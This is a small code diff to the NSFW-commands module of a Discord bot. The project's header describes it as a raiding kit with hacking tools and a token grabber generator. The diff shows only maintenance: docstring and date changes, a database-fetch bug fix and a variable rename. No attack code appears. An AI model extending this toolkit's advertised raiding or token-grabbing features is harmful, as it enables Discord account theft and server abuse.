@@ -1,5 +1,5 @@
-'''
-Discord Raidkit v2.3.0 — "The trojan horse of discord raiding" 
+"""
+Discord Raidkit v2.3.1 — "The trojan horse of discord raiding"
 Copyright © 2022 the-cult-of-integral
 
 a collection of raiding tools, hacking tools, and a token grabber generator for discord; written in Python 3
@@ -8,8 +8,8 @@ This program is under the GNU General Public License v2.0.
 https://github.com/the-cult-of-integral/discord-raidkit/blob/master/LICENSE
 
 nsfw.py contains all nsfw commands for the Qetesh raidkit.
-nsfw.py was last updated on 11/08/22 at 13:37.
-'''
+nsfw.py was last updated on 04/09/22 at 18:34.
+"""
 
 import logging
 import os
@@ -343,7 +343,7 @@ class Nsfw(commands.Cog):
         sql = f'SELECT do{command.title()} FROM Nsfw WHERE server_id = (?);'
         if not self.__exec_select(sql, guild_id):
             return True
-        return bool(self.c.fetchone[0])
+        return bool(self.c.fetchone()[0])
 
     def __only_nsfw(self, guild_id: int) -> bool:
         sql = 'SELECT onlyNsfwChannels FROM Servers WHERE server_id = (?);'
@@ -354,8 +354,8 @@ class Nsfw(commands.Cog):
     def __check_link(self, link: str, category: str, guild_id: int) -> bool:
         sql = f'SELECT prev{category.title()} FROM PreviousLinks WHERE server_id = (?);'
         self.__exec_select(sql, guild_id)
-        prevLink = self.c.fetchone()[0]
-        return not (link == prevLink)
+        prev_link = self.c.fetchone()[0]
+        return not (link == prev_link)
 
     def __check_guild(self, guild_id: int) -> bool:
         sql = 'SELECT count(*) FROM Servers WHERE server_id=?'
